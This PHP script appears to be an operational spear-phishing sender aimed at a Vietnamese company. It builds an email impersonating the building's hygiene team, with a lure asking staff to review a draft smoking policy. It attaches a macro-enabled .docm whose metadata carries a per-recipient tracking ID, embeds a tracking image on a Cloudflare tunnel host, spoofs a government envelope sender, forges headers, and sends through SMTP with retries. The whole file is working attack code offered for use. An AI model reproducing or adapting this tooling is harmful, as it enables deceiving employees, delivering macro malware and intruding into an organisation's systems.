<?php
include_once 'curl_multi_parallel.php';

function encodeHeader($key, $value)
{
  $preferences = array(
    'input-charset' => 'UTF-8',
    'output-charset' => 'UTF-8',
    'scheme' => 'Q', // B or Q
    // 'line-length' => 76,
    // 'line-break-chars' => "\n",
  );
  return iconv_mime_encode($key, $value, $preferences);
}

function gen_uuid()
{
  return sprintf(
    '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    // 32 bits for "time_low"
    mt_rand(0, 0xffff),
    mt_rand(0, 0xffff),

    // 16 bits for "time_mid"
    mt_rand(0, 0xffff),

    // 16 bits for "time_hi_and_version",
    // four most significant bits holds version number 4
    mt_rand(0, 0x0fff) | 0x4000,

    // 16 bits, 8 bits for "clk_seq_hi_res",
    // 8 bits for "clk_seq_low",
    // two most significant bits holds zero and one for variant DCE1.1
    mt_rand(0, 0x3fff) | 0x8000,

    // 48 bits for "node"
    mt_rand(0, 0xffff),
    mt_rand(0, 0xffff),
    mt_rand(0, 0xffff)
  );
}

function Zip($source, $destination)
{
  $zip = new ZipArchive();
  if (!$zip->open($destination, ZIPARCHIVE::OVERWRITE | ZipArchive::CREATE)) {
    return false;
  }

  $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

  $source = str_replace(['/', '\\'], '/', $source) . '/';

  foreach ($files as $file) {
    // Ignore "." and ".." folders
    if (in_array(basename($file), array('.', '..')))
      continue;

    if (is_file($file) === true) {
      $entryPath = ltrim(str_replace($source, '', str_replace(['/', '\\'], '/', $file)), '/');
      if ($entryPath == 'docProps/core.xml') continue;
      $zip->addFile($file, $entryPath);
    }
  }

  return $zip;
}

$arg_email = $argv[1];
$arg_name = $argv[2];
if (!$arg_email) exit(1);

$from_addr = '"' . addcslashes(mb_encode_mimeheader('Tổ vệ sinh', "UTF-8", "Q"), '"') . '" <tovesinh@dfcorp.com>';

$to_addr = '"' . addcslashes(mb_encode_mimeheader($arg_name, "UTF-8", "Q"), '"') . '" <' . $arg_email . '>';
$base64_email = rawurlencode(base64_encode($arg_email . '_md_' . rand(1, 100000)));

$subjectHeader = encodeHeader("Subject", "V/v Góp ý dự thảo ban hành quy định giữ vệ sinh chung");

$textContent = quoted_printable_encode(<<<EOF
Kính gửi các Anh/Chị,

Hiện nay có nhiều đơn vị chưa thực hiện giữ gìn vệ sinh chung của toà nhà, kính đề nghị các anh/chị quan tâm, lưu ý về việc giữ vệ sinh chung, cảnh quan của toà nhà.
Dưới đây là dự thảo ban hành quy định giữ vệ sinh chung về việc thay đổi nơi giới hạn dùng thuốc lá và thuốc lá điện tử.
Kính đề nghị các anh/chị đọc và góp ý về dự thảo nội dung trước 14h ngày 25/02/2023.

Trân trọng./.
EOF);

$htmlContent = quoted_printable_encode(<<<EOF
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style type="text/css" style="display:none;"><!-- P {margin-top:0;margin-bottom:0;} --></style>
</head>
<body dir="ltr">
<div id="divtagdefaultwrapper" style="font-size:12pt;color:#000000;font-family:Calibri,Helvetica,sans-serif;" dir="ltr">
<div>Kính gửi các Anh/Chị,<br>
</div>
<div><br>
</div>
<div>Hiện nay có nhiều đơn vị chưa thực hiện giữ gìn vệ sinh chung của toà nhà, kính đề nghị các anh/chị quan tâm, lưu ý về việc giữ vệ sinh chung, cảnh quan của toà nhà.<br>
Dưới đây là dự thảo ban hành quy định giữ vệ sinh chung về việc thay đổi nơi giới hạn dùng thuốc lá và thuốc lá điện tử.<br>
Kính đề nghị các anh/chị đọc và góp ý về dự thảo nội dung trước 14h ngày 25/02/2023.<br>
<br>
Trân trọng./.</div>
<div><br>
<img style="width: 200px" src="https://bow-s-equations-tone.trycloudflare.com/logo/${base64_email}">
<br>
</div>
</div>
</body>
</html>
<!-- {$_SERVER['REQUEST_TIME']} -->
EOF);
$fileName = 'Dự thảo ban hành quy định giữ vệ sinh chung.docm';

// add email
$file_path = @tempnam("./", "zip") . '.zip';
$zip = Zip('./attach.docm.extracted', $file_path);
if (!$zip) {
  unlink($file_path);
  exit('Error create zip');
}
$zip->addFromString('docProps/core.xml', '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title></dc:title><dc:subject></dc:subject><dc:creator>unknown</dc:creator><cp:keywords></cp:keywords><dc:description>' . $base64_email . '</dc:description><cp:lastModifiedBy>unknown</cp:lastModifiedBy><cp:revision>10</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2022-09-28T10:20:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2022-09-28T10:54:00Z</dcterms:modified></cp:coreProperties>');
$zip->close();
$zipData = file_get_contents($file_path);
unlink($file_path);
// add email

$fileContent = chunk_split(base64_encode($zipData));

$rand_id = rand(100000, 999999) . '_' . rand(100000000, 999999999);
$uuid = gen_uuid();

$email_id = md5($_SERVER['REQUEST_TIME_FLOAT']);

$content = <<<EOF
Date: Mon, 25 Feb 2023 15:31:50 +0700 (ICT)
From: ${from_addr}
To: ${to_addr}
Message-ID: <{$email_id}@dfcorp.com>
{$subjectHeader}
MIME-Version: 1.0
Content-Type: multipart/mixed; 
	boundary="----=_Part_{$rand_id}.{$_SERVER['REQUEST_TIME']}"
X-Originating-IP: [203.119.8.78]

------=_Part_{$rand_id}.{$_SERVER['REQUEST_TIME']}
Content-Type: multipart/alternative; 
	boundary="=_{$uuid}"

--=_{$uuid}
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

{$textContent}

--=_{$uuid}
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: quoted-printable

{$htmlContent}

--=_{$uuid}--

------=_Part_{$rand_id}.{$_SERVER['REQUEST_TIME']}
Content-Transfer-Encoding: base64
Content-Description: ${fileName}
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document; name="${fileName}"
Content-Disposition: attachment; filename="${fileName}"

${fileContent}

------=_Part_{$rand_id}.{$_SERVER['REQUEST_TIME']}--
EOF;

$requests = [
  [
    'url' => 'smtp://mail.dfcorp.com/mail.dfcorp.com',
    'no_verify' => true,
    'opts' => [
      // CURLOPT_PROXY => trim(file_get_contents('proxy.txt')),
      CURLOPT_MAIL_FROM  => 'nvtu@mic.gov.vn',
      CURLOPT_MAIL_RCPT  => [$arg_email],
      CURLOPT_USE_SSL  => CURLUSESSL_ALL,
      CURLOPT_UPLOAD => true,
      CURLOPT_INFILESIZE => strlen($content),
      CURLOPT_READFUNCTION => function ($ch, $fh, $length = false) use ($content) {
        static $pos = 0;
        $data = substr($content, $pos, $length);
        $pos += strlen($data);
        return $data;
      },
      CURLOPT_VERBOSE => true,
      CURLOPT_STDERR => fopen('php://stderr', 'a+'),
      CURLOPT_CONNECTTIMEOUT => 20,
    ],
    'timeout' => 40,
  ],
];

$lastTime = microtime(true);
curl_multi_parallel(function ($resp) {
  // var_dump($resp);
  echo 'Retrying..', PHP_EOL;
  if ($resp['error'] && $resp['error'] != "RCPT failed: 550") {
    // if (is_file('proxy.txt'))
    //   $resp['request']['opts'][CURLOPT_PROXY] = trim(file_get_contents('proxy.txt'));
    return $resp['request']; // retry
  }
  echo 'Done', PHP_EOL;
}, $requests, 2, [
  CURLMOPT_MAX_TOTAL_CONNECTIONS => 3,
  CURLMOPT_MAX_HOST_CONNECTIONS => 3,
  CURLMOPT_PIPELINING => CURLPIPE_MULTIPLEX,
]);

echo 'Done: ', microtime(true) - $lastTime, PHP_EOL;
$lastTime = microtime(true);